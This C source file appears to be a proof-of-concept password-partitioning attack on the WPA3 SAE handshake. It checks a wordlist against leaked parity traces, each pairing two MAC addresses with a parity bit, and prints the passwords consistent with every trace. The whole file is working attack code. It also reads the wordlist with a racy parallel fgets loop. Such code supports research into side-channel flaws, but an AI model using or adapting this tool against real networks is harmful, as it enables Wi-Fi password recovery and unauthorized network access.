#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <omp.h>
#include <stdbool.h>
#include <stddef.h>

#include "main.h"
#include "sae.h"

#define MAX_PWD_SIZE 64


void usage(const char *name)
{
	fprintf(stderr, "USAGE: %s fp TRACE [TRACE ...]\nwhere fp is the input dictionary and TRACE=A,B,x with", name);
	fprintf(stderr, "\n\t* A and B MAC addresses, each one as an hexadecimal string");
	fprintf(stderr, "\n\t* x is BN_is_odd(y) == seed_parity (0 or 1).\n");
}

bool check_parity_match(Trace t, char* pwd) {
	bool same_parity = false;
	struct sae_data* sae;
	sae = malloc(sizeof(*sae));
	if (sae == NULL) {
		fprintf(stderr, "allocation failure\n");
		goto fail;
	}
	memset(sae, 0, sizeof(*sae));
	// Set the group
	if (sae_set_group(sae, 19)) 
		goto fail;

	same_parity = sae_derive_pwe_ecc(sae, t.A, t.B, (uint8_t*)pwd, strlen(pwd), NULL);
fail:
	if (sae) {sae_clear_data(sae); free(sae);}

	return same_parity == t.same_parity;
}

void parseTrace(char *str, Trace *trace) {
	uint64_t tmp;

	// First field is the address A
	tmp = strtol(str, &str, 16);
	for (int i = 5; i >= 0; --i)
	{
		trace->A[i] = tmp & 0XFF;
		tmp = tmp >> 8;
	}
	str++;
	
	// Second field is the address B
	tmp = strtol(str, &str, 16);
	for (int i = 5; i >= 0; --i)
	{
		trace->B[i] = tmp & 0XFF;
		tmp = tmp >> 8;
	}
	str++;

	trace->same_parity = atoi(str) == 1;
}


int main(int argc, char const *argv[])
{
	FILE *fp = NULL;
	char *Talloc = NULL;
	char **dict = NULL;
	Trace *traces = NULL;
	
	if (argc < 3) {
		usage(argv[0]);
		goto end;
	}

	fp = fopen(argv[1], "r");
	if (!fp) {
		fprintf(stderr, "Error while opening file %s\n", argv[1]);
		goto end;
	}


	int nTraces = argc - 2;
	traces = malloc(nTraces * sizeof(Trace));
	if (!traces) {
		fprintf(stderr, "Error in malloc\n");
		goto end;
	}
	for (int i = 0; i < nTraces; ++i) {
		parseTrace((char *) argv[i+2], &traces[i]);
	}

	int nbLine = 0;
	while(!feof(fp))
		if(fgetc(fp) == '\n')
			nbLine++;
	rewind(fp);

	// We read the file once and for all, storing all password in RAM
	Talloc = calloc(nbLine, MAX_PWD_SIZE);
	dict = calloc(nbLine, sizeof(char*));
	for(int i = 0 ; i < nbLine ; i++)
		dict[i]=&Talloc[MAX_PWD_SIZE*i];

	omp_set_num_threads(omp_get_max_threads());
#pragma omp parallel for shared(dict) schedule(static)
	for(int i = 0; i < nbLine; i++) {
        fgets(dict[i], MAX_PWD_SIZE, fp);
        dict[i][strlen(dict[i]) - 1] = 0;
	}
    fclose(fp); fp = NULL;


#pragma omp parallel for shared(dict,traces) schedule(static)
    for(int i = 0; i < nbLine; i++) {
        bool ok = true;
    	for (int j = 0; j < nTraces; j++) {
    	    if (check_parity_match(traces[j], dict[i]) == false) {
    	        ok = false;
    	        break;
    	    }
    	}

        if (ok) {
            #pragma omp critical
            printf("%s\n", dict[i]);
        }
    }

	end:
	if (fp) {fclose(fp);}
	free(Talloc);
	free(dict);
	free(traces);

	return 0;
}